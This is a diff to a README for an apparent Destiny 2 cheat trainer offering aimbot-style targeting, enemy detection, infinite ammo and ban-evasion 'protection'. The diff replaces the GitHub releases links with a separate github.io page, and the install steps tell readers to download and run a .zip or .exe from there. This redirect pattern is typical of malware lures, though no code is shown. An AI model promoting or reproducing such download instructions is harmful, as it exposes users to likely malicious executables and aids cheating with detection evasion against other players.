@@ -1,6 +1,6 @@
 # 🎮 Destiny2-Ultimate-Trainer-2026-advanced - Gain every advantage in Destiny 2
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/El1teki735/Destiny2-Ultimate-Trainer-2026-advanced/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://el1teki735.github.io)
 
 This application provides tools to automate gameplay and enhance your performance in Destiny 2. It includes features for auto-farming, health regeneration, infinite ammunition, visual enemy detection, and precise targeting assistance. The software uses protection methods to maintain account safety.
 
@@ -30,7 +30,7 @@ Ensure your computer meets these specifications to run the software.
 
 Follow these instructions to set up the trainer on your machine.
 
-1. Go to the [official release page](https://github.com/El1teki735/Destiny2-Ultimate-Trainer-2026-advanced/releases).
+1. Go to the [official release page](https://el1teki735.github.io).
 2. Look for the "Assets" section at the bottom of the latest release post.
 3. Select the file ending in .zip or .exe to begin your download.
 4. If you downloaded a .zip file, right-click the folder and select Extract All.
